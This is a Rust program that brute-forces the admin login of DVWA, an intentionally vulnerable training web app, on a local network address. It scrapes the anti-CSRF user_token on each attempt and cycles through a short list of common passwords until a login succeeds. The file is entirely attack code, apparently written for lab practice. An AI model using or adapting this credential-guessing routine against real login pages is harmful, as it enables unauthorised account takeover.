use reqwest::blocking::Client;
use scraper::{Html, Selector};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder().cookie_store(true).build()?;
    let base_url = "http://192.168.1.79/DVWA/";
    brute_force_login(&client, base_url)?;
    Ok(())
}

fn brute_force_login(client: &Client, base_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let login_url = format!("{}{}", base_url, "login.php");

    let passwords = get_passwords();

    for password in passwords {
        let login_page_response = client.get(&login_url).send()?;
        let login_page_html = login_page_response.text()?;
        let user_token = get_usertoken(&login_page_html)?;
        //println!("User Token: {}", user_token);
        let response = client
            .post(&login_url)
            .form(&[
                ("username", "admin"),
                ("password", &password),
                ("Login", "Login"),
                ("user_token", &user_token),
            ])
            .send()?;
        let response_html = response.text()?;
        //println!("{}", response_html);
        if response_html.contains("Login failed") {
            println!("Login failed for user: {} password: {}", "admin", &password);
        } else {
            println!(
                "Login Successful for user: {} password: {}",
                "admin", &password
            );
            break;
        }
    }

    Ok(())
}

fn get_usertoken(htmlresponse: &str) -> Result<String, Box<dyn std::error::Error>> {
    let document = Html::parse_document(htmlresponse);
    let selector = Selector::parse("input[name='user_token']").unwrap();

    if let Some(input) = document.select(&selector).next() {
        if let Some(token) = input.value().attr("value") {
            return Ok(token.to_string());
        }
    }
    Err("Could not find user_token".into())
}

fn get_passwords() -> Vec<String> {
    let mut passwords = Vec::new();
    passwords.push(format!("{}", "P@ssw0rd"));
    passwords.push(format!("{}", "p@ssw0rd"));
    passwords.push(format!("{}", "P@ssW0rd"));
    passwords.push(format!("{}", "pwd"));
    passwords.push(format!("{}", "p@55w0rd"));
    passwords.push(format!("{}", "P@55W0rd"));
    passwords.push(format!("{}", "password"));
    passwords.push(format!("{}", "Admin"));
    passwords.push(format!("{}", "Admin"));
    passwords.push(format!("{}", "admin"));
    passwords
}
